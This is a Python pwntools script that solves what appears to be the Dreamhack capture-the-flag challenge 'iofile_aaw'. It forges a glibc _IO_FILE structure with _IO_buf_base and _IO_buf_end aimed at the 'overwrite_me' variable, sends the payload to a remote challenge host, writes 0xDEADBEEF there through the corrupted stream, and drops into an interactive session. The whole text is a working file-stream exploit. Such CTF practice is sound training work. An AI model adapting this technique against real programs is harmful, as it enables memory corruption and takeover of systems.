from pwn import *

def slog(symbol, addr): return success(symbol + ": " + hex(addr))
context.log_level = 'debug'

# p = process("./iofile_aaw")
p = remote("host1.dreamhack.games", 21909)
e = ELF("./iofile_aaw")
libc = ELF("./libc.so.6")

# gdb.attach(p)

over_me = e.symbols['overwrite_me']

payload = p64(0xfbad0000 | 0x0000) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64(0x0) # _IO_write_ptr 
payload += p64(0x0) # _IO_write_end
payload += p64(over_me) # _IO_buf_base
payload += p64(over_me+1024) # _IO_buf_end 
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno

p.recvuntil(b": ")
p.sendline(payload)
p.sendline(p64(0xDEADBEEF)+b"\x00"*(1024-10))
p.interactive()